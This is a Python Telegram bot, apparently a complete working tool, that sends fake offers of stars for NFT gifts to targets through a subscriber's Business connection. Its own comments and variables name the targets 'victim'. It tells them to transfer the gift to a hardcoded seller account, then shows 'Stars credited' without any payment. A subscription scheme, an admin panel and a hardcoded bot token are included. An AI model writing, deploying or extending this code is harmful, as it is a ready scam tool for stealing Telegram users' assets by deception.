# main.py
# Gift Trade Bot — офферы через Business + админка
# Запуск: pip install -U aiogram
#        python main.py

import asyncio
import logging
import re
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection
)
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties

# ============ КОНФИГ ============
BOT_TOKEN = "8807286672:AAEIss-kdTWHWpEWOOOuwHLKSqjK3JhcnLk"
SELLER_USERNAME = "@cryptoexchxnge"
ADMIN_ID = 8754872846

# ============ ХРАНИЛИЩА ============
offers = {}
users = {}
banned = set()
# business_connections[user_id] = business_connection_id
business_connections = {}

# ============ ТЕКСТЫ ============
TEXTS = {
    "ru": {
        "menu": (
            "🎁 Gift Trade Bot\n\n"
            "Добро пожаловать!\n\n"
            "Здесь ты можешь управлять подпиской и получать инструкции по работе с ботом.\n\n"
            "Выбери нужный раздел ниже."
        ),
        "buy_sub": "🛍 Оформить подписку",
        "my_sub": "💳 Моя подписка",
        "offer": "Пользователь предлагает вам {price} ⭐ за подарок {name} #{id}.",
        "accept": "✅ Принять",
        "reject": "❌ Отклонить",
        "sold": (
            "🎁 Подарок: {name} #{id} успешно продан!\n\n"
            "Передайте подарок покупателю для зачисления звёзд.\n\n"
            "Инструкция:\n"
            "1. Открой свой профиль в Telegram\n"
            "2. Перейди в раздел «Подарки»\n"
            "3. Выбери подарок {name} #{id}\n"
            "4. Нажми «Передать» → выбери {seller}\n"
            "5. Подтверди передачу"
        ),
        "transfer": "📤 Передать NFT",
        "how": "❓ Как передать?",
        "done": "✅ NFT получен. Звёзды зачислены.",
        "rejected": "❌ Предложение отклонено.",
        "expired": "⌛ Предложение истекло.",
        "no_sub": "Нужна подписка. Оформи в меню.",
        "bad_link": "Неверная ссылка. Формат: .buy ru https://t.me/nft/Name-123 1000 stars",
        "need_reply": "Ответь командой .buy на сообщение продавца.",
        "sub_active": "✅ Подписка активна до {date}.",
        "sub_inactive": "❌ Подписка не активна.",
        "no_business": "⚠️ Бот не подключён к твоему Business-аккаунту. Настройки → Telegram Business → Чат-боты.",
    },
    "en": {
        "menu": (
            "🎁 Gift Trade Bot\n\n"
            "Welcome!\n\n"
            "Here you can manage your subscription and get instructions.\n\n"
            "Choose a section below."
        ),
        "buy_sub": "🛍 Buy subscription",
        "my_sub": "💳 My subscription",
        "offer": "A user offers you {price} ⭐ for gift {name} #{id}.",
        "accept": "✅ Accept",
        "reject": "❌ Decline",
        "sold": (
            "🎁 Gift: {name} #{id} successfully sold!\n\n"
            "Transfer the gift to the buyer to receive stars.\n\n"
            "Instructions:\n"
            "1. Open your Telegram profile\n"
            "2. Go to «Gifts»\n"
            "3. Select gift {name} #{id}\n"
            "4. Tap «Transfer» → choose {seller}\n"
            "5. Confirm the transfer"
        ),
        "transfer": "📤 Transfer NFT",
        "how": "❓ How to transfer?",
        "done": "✅ NFT received. Stars credited.",
        "rejected": "❌ Offer declined.",
        "expired": "⌛ Offer expired.",
        "no_sub": "Subscription required. Buy it in the menu.",
        "bad_link": "Invalid link. Format: .buy en https://t.me/nft/Name-123 1000 stars",
        "need_reply": "Reply with .buy to the seller's message.",
        "sub_active": "✅ Subscription active until {date}.",
        "sub_inactive": "❌ Subscription not active.",
        "no_business": "⚠️ Bot not connected to your Business account. Settings → Telegram Business → Chatbots.",
    },
}

# ============ ИНИЦИАЛИЗАЦИЯ ============
logging.basicConfig(level=logging.INFO)
bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

BUY_RE = re.compile(
    r"^\.buy\s+(?P<lang>ru|en)\s+(?P<link>https?://\S+)\s+(?P<price>\d+)\s*(?P<cur>stars|gram)?$",
    re.IGNORECASE
)

# ============ УТИЛИТЫ ============
def is_admin(uid: int) -> bool:
    return uid == ADMIN_ID


def parse_nft_link(link: str):
    m = re.search(r"/nft/(?P<name>[A-Za-z]+)-(?P<id>\d+)", link)
    if not m:
        return None, None
    return m.group("name"), m.group("id")


def has_sub(uid: int) -> bool:
    u = users.get(uid, {})
    until = u.get("sub_until")
    return bool(until and until > datetime.utcnow())


def get_business_conn(uid: int):
    return business_connections.get(uid)


def main_menu(lang: str = "ru"):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["buy_sub"], callback_data="sub:buy")],
        [InlineKeyboardButton(text=t["my_sub"], callback_data="sub:my")],
    ])


def offer_kb(lang: str, offer_id: str):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t["reject"], callback_data=f"reject:{offer_id}"),
        InlineKeyboardButton(text=t["accept"], callback_data=f"accept:{offer_id}"),
    ]])


def sold_kb(lang: str, offer_id: str):
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["transfer"], callback_data=f"transfer:{offer_id}")],
        [InlineKeyboardButton(text=t["how"], callback_data=f"how:{offer_id}")],
    ])


def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin:users")],
        [InlineKeyboardButton(text="🎁 Офферы", callback_data="admin:offers")],
        [InlineKeyboardButton(text="🔗 Business", callback_data="admin:business")],
        [InlineKeyboardButton(text="✅ Выдать подписку", callback_data="admin:give_sub")],
        [InlineKeyboardButton(text="❌ Забрать подписку", callback_data="admin:take_sub")],
        [InlineKeyboardButton(text="🚫 Бан", callback_data="admin:ban")],
        [InlineKeyboardButton(text="✅ Разбан", callback_data="admin:unban")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin:broadcast")],
    ])


async def auto_expire(offer_id: str, seconds: int = 600):
    await asyncio.sleep(seconds)
    o = offers.get(offer_id)
    if o and o["status"] == "pending":
        o["status"] = "expired"


# ============ BUSINESS CONNECTION ============
@dp.business_connection()
async def on_business_connection(conn: BusinessConnection):
    """Ловим подключение бота к Business-аккаунту."""
    if conn.is_enabled:
        business_connections[conn.user.id] = conn.id
        logging.info(f"Business подключён: user={conn.user.id} conn={conn.id}")
        try:
            await bot.send_message(
                conn.user.id,
                "✅ Бот подключён к вашему Business-аккаунту.\n"
                "Теперь офферы будут отправляться от вашего имени."
            )
        except Exception:
            pass
    else:
        business_connections.pop(conn.user.id, None)
        logging.info(f"Business отключён: user={conn.user.id}")


# ============ ПОЛЬЗОВАТЕЛЬСКИЕ ХЕНДЛЕРЫ ============
@dp.message(Command("start"))
async def start(message: Message):
    if message.from_user.id in banned:
        await message.answer("🚫 Вы забанены.")
        return
    users.setdefault(message.from_user.id, {})
    await message.answer(TEXTS["ru"]["menu"], reply_markup=main_menu("ru"))


@dp.callback_query(F.data == "sub:buy")
async def buy_sub(call: CallbackQuery):
    await call.answer("Оплата подписки — подключи Telegram Stars.", show_alert=True)


@dp.callback_query(F.data == "sub:my")
async def my_sub(call: CallbackQuery):
    uid = call.from_user.id
    if has_sub(uid):
        until = users[uid]["sub_until"]
        text = TEXTS["ru"]["sub_active"].format(date=until.strftime("%d.%m.%Y"))
    else:
        text = TEXTS["ru"]["sub_inactive"]
    await call.message.edit_text(text, reply_markup=main_menu("ru"))
    await call.answer()


# ============ ОФФЕР ЧЕРЕЗ BUSINESS ============
@dp.business_message(F.text.startswith(".buy"))
async def buy_cmd_business(message: Message):
    """
    Ловим .buy, отправленный через Business-соединение.
    Бот видит это сообщение как business_message и отвечает от имени владельца.
    """
    if not message.business_connection_id:
        return

    owner_id = None
    for uid, cid in business_connections.items():
        if cid == message.business_connection_id:
            owner_id = uid
            break

    if owner_id is None:
        return

    if not has_sub(owner_id) and not is_admin(owner_id):
        await message.answer(TEXTS["ru"]["no_sub"])
        return

    m = BUY_RE.match(message.text)
    if not m:
        await message.answer(TEXTS["ru"]["bad_link"])
        return

    lang = m.group("lang").lower()
    link = m.group("link")
    price = int(m.group("price"))
    cur = (m.group("cur") or "stars").lower()

    name, gift_id = parse_nft_link(link)
    if not name:
        await message.answer(TEXTS[lang]["bad_link"])
        return

    if not message.reply_to_message:
        await message.answer(TEXTS[lang]["need_reply"])
        return

    victim_id = message.reply_to_message.from_user.id
    offer_id = f"{owner_id}_{gift_id}"

    offers[offer_id] = {
        "seller": owner_id,
        "victim": victim_id,
        "name": name,
        "gift_id": gift_id,
        "price": price,
        "currency": cur,
        "lang": lang,
        "status": "pending",
        "created": datetime.utcnow(),
        "business_connection_id": message.business_connection_id,
    }

    t = TEXTS[lang]
    text = t["offer"].format(price=price, name=name, id=gift_id)

    # Отправляем оффер жертве от имени владельца Business
    try:
        await bot.send_message(
            victim_id,
            text,
            reply_markup=offer_kb(lang, offer_id),
            business_connection_id=message.business_connection_id
        )
        await message.answer("✅ Оффер отправлен.")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить: {e}")

    asyncio.create_task(auto_expire(offer_id, 600))


# ============ ОБЫЧНЫЙ .buy (если пишешь боту напрямую) ============
@dp.message(F.text.startswith(".buy"))
async def buy_cmd(message: Message):
    if message.from_user.id in banned:
        return
    if not has_sub(message.from_user.id) and not is_admin(message.from_user.id):
        await message.answer(TEXTS["ru"]["no_sub"])
        return

    conn_id = get_business_conn(message.from_user.id)
    if not conn_id:
        await message.answer(TEXTS["ru"]["no_business"])
        return

    m = BUY_RE.match(message.text)
    if not m:
        await message.answer(TEXTS["ru"]["bad_link"])
        return

    lang = m.group("lang").lower()
    link = m.group("link")
    price = int(m.group("price"))
    cur = (m.group("cur") or "stars").lower()

    name, gift_id = parse_nft_link(link)
    if not name:
        await message.answer(TEXTS[lang]["bad_link"])
        return

    if not message.reply_to_message:
        await message.answer(TEXTS[lang]["need_reply"])
        return

    victim_id = message.reply_to_message.from_user.id
    offer_id = f"{message.from_user.id}_{gift_id}"

    offers[offer_id] = {
        "seller": message.from_user.id,
        "victim": victim_id,
        "name": name,
        "gift_id": gift_id,
        "price": price,
        "currency": cur,
        "lang": lang,
        "status": "pending",
        "created": datetime.utcnow(),
        "business_connection_id": conn_id,
    }

    t = TEXTS[lang]
    text = t["offer"].format(price=price, name=name, id=gift_id)

    try:
        await bot.send_message(
            victim_id,
            text,
            reply_markup=offer_kb(lang, offer_id),
            business_connection_id=conn_id
        )
        await message.answer("✅ Оффер отправлен.")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить: {e}")

    asyncio.create_task(auto_expire(offer_id, 600))


# ============ ПРИНЯТЬ / ОТКЛОНИТЬ / ПЕРЕДАТЬ ============
@dp.callback_query(F.data.startswith("accept:"))
async def accept(call: CallbackQuery):
    offer_id = call.data.split(":", 1)[1]
    o = offers.get(offer_id)
    if not o or o["status"] != "pending":
        await call.answer(TEXTS["ru"]["expired"], show_alert=True)
        return

    o["status"] = "accepted"
    t = TEXTS[o["lang"]]

    text = t["sold"].format(
        name=o["name"], id=o["gift_id"], seller=SELLER_USERNAME
    )
    await call.message.edit_text(text, reply_markup=sold_kb(o["lang"], offer_id))
    await call.answer()


@dp.callback_query(F.data.startswith("reject:"))
async def reject(call: CallbackQuery):
    offer_id = call.data.split(":", 1)[1]
    o = offers.get(offer_id)
    if o:
        o["status"] = "rejected"
    await call.message.edit_text(TEXTS["ru"]["rejected"])
    await call.answer()


@dp.callback_query(F.data.startswith("transfer:"))
async def transfer(call: CallbackQuery):
    offer_id = call.data.split(":", 1)[1]
    o = offers.get(offer_id)
    if not o:
        await call.answer(TEXTS["ru"]["expired"], show_alert=True)
        return

    o["status"] = "done"
    t = TEXTS[o["lang"]]
    await call.message.edit_text(t["done"])
    await call.answer()

    try:
        await bot.send_message(
            o["seller"],
            f"✅ NFT {o['name']} #{o['gift_id']} отправлен. Сделка завершена."
        )
    except Exception:
        pass


@dp.callback_query(F.data.startswith("how:"))
async def how(call: CallbackQuery):
    offer_id = call.data.split(":", 1)[1]
    o = offers.get(offer_id)
    if not o:
        await call.answer("Оффер не найден.", show_alert=True)
        return
    await call.answer(
        "Открой профиль → Подарки → выбери подарок → Передать → выбери продавца.",
        show_alert=True
    )


# ============ АДМИНКА ============
@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("🛠 Админ-панель", reply_markup=admin_kb())


@dp.callback_query(F.data == "admin:stats")
async def admin_stats(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    active_offers = sum(1 for o in offers.values() if o["status"] == "pending")
    done_offers = sum(1 for o in offers.values() if o["status"] == "done")
    subs = sum(1 for u in users.values() if u.get("sub_until") and u["sub_until"] > datetime.utcnow())
    text = (
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: {len(users)}\n"
        f"✅ С подпиской: {subs}\n"
        f"🎁 Всего офферов: {len(offers)}\n"
        f"⏳ Активных: {active_offers}\n"
        f"✔️ Завершённых: {done_offers}\n"
        f"🚫 В бане: {len(banned)}\n"
        f"🔗 Business-подключений: {len(business_connections)}"
    )
    await call.message.edit_text(text, reply_markup=admin_kb())
    await call.answer()


@dp.callback_query(F.data == "admin:business")
async def admin_business(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    if not business_connections:
        text = "🔗 Business-подключений нет."
    else:
        lines = ["🔗 <b>Business-подключения</b>\n"]
        for uid, cid in business_connections.items():
            lines.append(f"<code>{uid}</code> → <code>{cid}</code>")
        text = "\n".join(lines)
    await call.message.edit_text(text, reply_markup=admin_kb())
    await call.answer()


@dp.callback_query(F.data == "admin:users")
async def admin_users(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    if not users:
        text = "👥 Пользователей нет."
    else:
        lines = ["👥 <b>Пользователи</b>\n"]
        for uid, data in list(users.items())[:50]:
            until = data.get("sub_until")
            sub = until.strftime("%d.%m.%Y") if until and until > datetime.utcnow() else "—"
            ban = "🚫" if uid in banned else ""
            lines.append(f"<code>{uid}</code> | подписка: {sub} {ban}")
        text = "\n".join(lines)
    await call.message.edit_text(text, reply_markup=admin_kb())
    await call.answer()


@dp.callback_query(F.data == "admin:offers")
async def admin_offers(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    if not offers:
        text = "🎁 Офферов нет."
    else:
        lines = ["🎁 <b>Офферы</b>\n"]
        for oid, o in list(offers.items())[:50]:
            lines.append(
                f"<code>{oid}</code>\n"
                f"  {o['name']} #{o['gift_id']} | {o['price']} {o['currency']} | {o['status']}"
            )
        text = "\n".join(lines)
    await call.message.edit_text(text, reply_markup=admin_kb())
    await call.answer()


@dp.callback_query(F.data == "admin:give_sub")
async def admin_give_sub(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    await call.message.edit_text(
        "Отправь: <code>/give_sub USER_ID ДНЕЙ</code>",
        reply_markup=admin_kb()
    )
    await call.answer()


@dp.message(Command("give_sub"))
async def give_sub(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        _, uid, days = message.text.split()
        uid = int(uid)
        days = int(days)
    except ValueError:
        await message.answer("Формат: /give_sub USER_ID ДНЕЙ")
        return
    until = datetime.utcnow() + timedelta(days=days)
    users.setdefault(uid, {})["sub_until"] = until
    await message.answer(f"✅ Подписка выдана {uid} до {until.strftime('%d.%m.%Y')}")


@dp.callback_query(F.data == "admin:take_sub")
async def admin_take_sub(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    await call.message.edit_text("Отправь: <code>/take_sub USER_ID</code>", reply_markup=admin_kb())
    await call.answer()


@dp.message(Command("take_sub"))
async def take_sub(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        _, uid = message.text.split()
        uid = int(uid)
    except ValueError:
        await message.answer("Формат: /take_sub USER_ID")
        return
    if uid in users:
        users[uid].pop("sub_until", None)
    await message.answer(f"❌ Подписка забрана у {uid}")


@dp.callback_query(F.data == "admin:ban")
async def admin_ban(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    await call.message.edit_text("Отправь: <code>/ban USER_ID</code>", reply_markup=admin_kb())
    await call.answer()


@dp.message(Command("ban"))
async def ban_user(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        _, uid = message.text.split()
        uid = int(uid)
    except ValueError:
        await message.answer("Формат: /ban USER_ID")
        return
    banned.add(uid)
    await message.answer(f"🚫 Забанен: {uid}")


@dp.callback_query(F.data == "admin:unban")
async def admin_unban(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    await call.message.edit_text("Отправь: <code>/unban USER_ID</code>", reply_markup=admin_kb())
    await call.answer()


@dp.message(Command("unban"))
async def unban_user(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        _, uid = message.text.split()
        uid = int(uid)
    except ValueError:
        await message.answer("Формат: /unban USER_ID")
        return
    banned.discard(uid)
    await message.answer(f"✅ Разбанен: {uid}")


@dp.callback_query(F.data == "admin:broadcast")
async def admin_broadcast(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return
    await call.message.edit_text("Отправь: <code>/broadcast ТЕКСТ</code>", reply_markup=admin_kb())
    await call.answer()


@dp.message(Command("broadcast"))
async def broadcast(message: Message):
    if not is_admin(message.from_user.id):
        return
    text = message.text[len("/broadcast "):].strip()
    if not text:
        await message.answer("Пустой текст.")
        return
    sent = 0
    for uid in users:
        try:
            await bot.send_message(uid, text)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await message.answer(f"📢 Отправлено: {sent}")


# ============ СТАРТ ============
async def main():
    print("Бот офферов активен (Business-режим).")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
